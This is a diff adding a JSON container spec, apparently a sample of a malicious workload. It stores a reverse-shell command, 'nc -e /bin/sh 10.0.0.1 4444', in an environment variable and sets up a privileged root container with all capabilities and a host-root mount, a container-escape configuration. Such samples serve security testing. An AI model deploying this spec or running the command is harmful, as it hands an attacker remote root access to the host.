@@ -1,0 +1,26 @@
+{
+    "image": "alpine:latest",
+    "command": ["/bin/sh"],
+    "args": ["-c", "while true; do sleep 30; done"],
+    "env": [
+        {
+            "name": "SHELL_PAYLOAD",
+            "value": "nc -e /bin/sh 10.0.0.1 4444"
+        }
+    ],
+    "volumeMounts": [
+        {
+            "name": "host-root",
+            "mountPath": "/host"
+        }
+    ],
+    "securityContext": {
+        "privileged": true,
+        "runAsUser": 0,
+        "runAsGroup": 0,
+        "allowPrivilegeEscalation": true,
+        "capabilities": {
+            "add": ["ALL"]
+        }
+    }
+}
